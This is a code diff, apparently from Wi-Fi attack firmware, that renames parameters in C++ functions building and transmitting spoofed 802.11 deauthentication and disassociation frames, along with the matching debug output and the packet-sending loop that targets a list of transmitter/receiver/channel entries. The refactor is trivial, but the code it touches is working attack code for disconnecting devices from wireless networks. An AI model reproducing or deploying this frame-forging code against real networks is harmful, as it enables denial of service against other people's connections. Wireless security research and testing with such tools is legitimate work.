@@ -37,19 +37,19 @@ typedef struct deauth_attack_data_t {
 deauth_attack_data_t deauth_data;
 
 // ========== SEND FUNCTIONS ========== //
-bool send_deauth(uint8_t ch, const uint8_t* from, const uint8_t* to) {
+bool send_deauth(uint8_t ch, const uint8_t* sender, const uint8_t* receiver) {
     deauth_pkt[0] = 0xc0;
-    memcpy(&deauth_pkt[10], from, 6);
-    memcpy(&deauth_pkt[16], from, 6);
-    memcpy(&deauth_pkt[4], to, 6);
+    memcpy(&deauth_pkt[10], sender, 6);
+    memcpy(&deauth_pkt[16], sender, 6);
+    memcpy(&deauth_pkt[4], receiver, 6);
     return send(ch, deauth_pkt, sizeof(deauth_pkt));
 }
 
-bool send_disassoc(uint8_t ch, const uint8_t* from, const uint8_t* to) {
+bool send_disassoc(uint8_t ch, const uint8_t* sender, const uint8_t* receiver) {
     deauth_pkt[0] = 0xa0;
-    memcpy(&deauth_pkt[10], from, 6);
-    memcpy(&deauth_pkt[16], from, 6);
-    memcpy(&deauth_pkt[4], to, 6);
+    memcpy(&deauth_pkt[10], sender, 6);
+    memcpy(&deauth_pkt[16], sender, 6);
+    memcpy(&deauth_pkt[4], receiver, 6);
     return send(ch, deauth_pkt, sizeof(deauth_pkt));
 }
 
@@ -100,9 +100,9 @@ void startDeauth(TargetList& targets, bool deauth, bool disassoc, unsigned long 
         while (targets.available()) {
             Target* t = targets.iterate();
             debugF("- transmitter ");
-            debug(strh::mac(t->getFrom()));
+            debug(strh::mac(t->getSender()));
             debugF(", receiver ");
-            debug(strh::mac(t->getTo()));
+            debug(strh::mac(t->getReceiver()));
             debugF(", channel ");
             debugln(t->getCh());
         }
@@ -165,8 +165,8 @@ void updateDeauth() {
         if (millis() - d.pkt_time >= d.pkt_interval) {
             Target* t = d.targets.iterate();
 
-            if (d.deauth) d.pkts_per_second += send_deauth(t->getCh(), t->getFrom(), t->getTo());
-            if (d.disassoc) d.pkts_per_second += send_disassoc(t->getCh(), t->getFrom(), t->getTo());
+            if (d.deauth) d.pkts_per_second += send_deauth(t->getCh(), t->getSender(), t->getReceiver());
+            if (d.disassoc) d.pkts_per_second += send_disassoc(t->getCh(), t->getSender(), t->getReceiver());
 
             d.pkt_time = millis();
         }
